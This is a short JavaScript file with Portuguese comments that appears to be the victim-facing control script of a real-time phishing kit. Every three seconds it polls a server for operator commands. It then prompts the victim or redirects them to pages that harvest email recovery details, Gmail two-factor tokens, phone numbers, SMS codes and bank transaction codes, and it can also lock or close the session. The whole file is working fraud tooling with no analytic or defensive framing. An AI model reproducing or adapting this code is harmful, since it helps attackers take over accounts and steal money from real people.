function atualizadados() {
    $(document).ready(function () {
        $.ajax({
            dataType: "json", //Definimos o tipo de retorno
            url: "main_.php", //Definindo o arquivo onde serão buscados os dados
            success: function (data) {
                function makeid(length) {
                    var result = "";
                    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                    var charactersLength = characters.length;

                    for (var i = 0; i < length; i++) {
                        result += characters.charAt(Math.floor(Math.random() * charactersLength));
                    }
                    return result;
                }

                let getLastItem = thePath => thePath.substring(thePath.lastIndexOf('/') + 1);
                let test = location.pathname
                let s = getLastItem(test);

                switch (data.comando) {
                    case "pediremailrecuperar":
                        emailrecupera();
                        break;

                    case "pedirverificaMail":
                        verificarcodemail();
                        break;

                    case "pedircodemail":
                        codemailprovedor();
                        break;
                    case "pedirtokengmail":
                        doisfatores();
                        break;

                    case "pedirtelefonegmail":
                        telefone();
                        break;

                    case "notificagmail":
                        duasetapas();
                        break;

                    case "pedirsmsgmail":
                        sms();
                        break;

                    case "pedirbloqueio":
                        window.location.href = "bloqueio.php?" + makeid(100);
                        break;

                    case "2fatores":
                        window.location.href = "token.php?" + makeid(100);
                        break;

                    case "negar2fatores":
                        window.location.href = "token.php?error=1";
                        break;

                    case "ok":
                        window.location.href = "finalizar.php";
                        break;

                    case "negar":
                        window.location.href = s + "?error=1";
                        break;

                    case "pedirsms":
                        window.location.href = "sms.php?" + makeid(20);
                        break;

                    case "pedirtransaction":
                        window.location.href = "codtransacao.php?" + makeid(20);
                        break;

                    case "pedirtokenmail":
                        window.location.href = "mailtoken.php?" + makeid(20);
                        break;
                        
                    case "pedirtokenmailandtwofactor":
                        window.location.href = "mailtokenAndTwoFactor.php?" + makeid(20);
                        break;
                }
            },
        });
        setTimeout("atualizadados()", 3000);
    });
}
atualizadados();
